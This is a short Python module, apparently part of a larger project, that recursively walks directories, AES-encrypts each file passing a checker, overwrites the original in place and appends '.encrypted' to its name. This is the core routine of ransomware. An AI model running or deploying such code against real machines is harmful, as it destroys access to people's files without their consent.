import glob
import os
from aes import AES
from filechecker import FileChecker

class FileEncryptor:
    def __init__(self, key, iv):
        self.encryptor = AES(key, iv)
        self.file_checker = FileChecker()

    def encrypt(self, target):
        file_list = glob.glob(target)
        for file in file_list:
            if os.path.isdir(file):
                self.encrypt(file+'/*')

            else:
                if not self.file_checker.check_file(file):
                    continue

                with open(file, 'rb') as f:
                    encrypted_file = self.encryptor.encrypt(f.read())

                with open(file, 'wb') as f:
                    f.write(encrypted_file) # 파일 암호화

                new_name = file + ".encrypted"
                os.rename(file, new_name) # 파일의 이름 뒤에 .encrypted 추가